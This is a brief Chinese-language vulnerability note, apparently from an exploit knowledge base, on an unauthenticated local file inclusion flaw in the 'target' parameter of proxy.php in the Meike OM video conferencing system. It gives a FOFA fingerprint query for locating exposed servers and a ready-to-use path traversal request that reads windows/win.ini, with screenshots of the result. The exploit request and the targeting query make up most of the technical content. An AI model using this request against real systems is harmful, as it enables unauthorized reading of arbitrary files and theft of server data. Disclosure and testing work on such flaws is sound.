# 魅课 OM视频会议系统 proxy.php 文件包含漏洞

## 漏洞描述

魅课OM视频会议系统 proxy.php文件target参数存在本地文件包含漏洞。攻击者可借助该漏洞无需登录便可下载任意文件。

## 漏洞影响

<a-checkbox checked>魅课OM视频会议系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="OMEETING-OM视频会议"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1630909738237-5162ec96-62e1-4c6b-85ed-f68afa1ffb59.png)

验证POC

```python
/admin/do/proxy.php?method=get&target=../../../../../../../../../../windows/win.ini
```

![img](../../../.vuepress/public/img/1630910015996-7abd7e35-7bb3-4fdc-b0b9-e203546a0de2.png)